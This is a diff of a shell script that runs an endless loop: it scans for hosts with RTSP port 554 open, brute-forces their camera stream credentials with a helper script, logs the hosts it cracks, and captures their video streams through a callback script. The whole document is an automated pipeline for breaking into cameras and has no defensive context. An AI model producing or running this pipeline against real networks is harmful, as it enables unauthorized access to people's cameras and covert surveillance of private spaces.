@@ -1,16 +1,22 @@
 #!/usr/bin/env sh
 while true; do
     echo
-    echo Remove hosts
-    rm ./local/hosts_554.txt
-    echo
     echo Gather IPs
-    ./fortune_port.py 554 250000 1024 -i tun0
+    ./fortune_rtsp.py -c 64 -t 0.6 -F -i tun0
+    cat local/rtsp_554.txt >> local/potential_rtsp.txt
+
     echo
     echo Brute
-    ./rtsp_brute.py -v 3 \
-        -ht 1024 -sp \
-        -i tun0 \
-        --capture --capture_callback local/campost.sh
+    ./rtsp_brute.py local/rtsp_554.txt \
+        -i tun0 -sp > local/bruted.txt
+    cat local/bruted.txt >> local/rtsp.txt
+
+    echo
+    echo Bruted:
+    cat local/bruted.txt
+
+    echo
+    echo Capture
+    ./rtsp_capture.py local/bruted.txt -cb local/campost.sh
 done
 
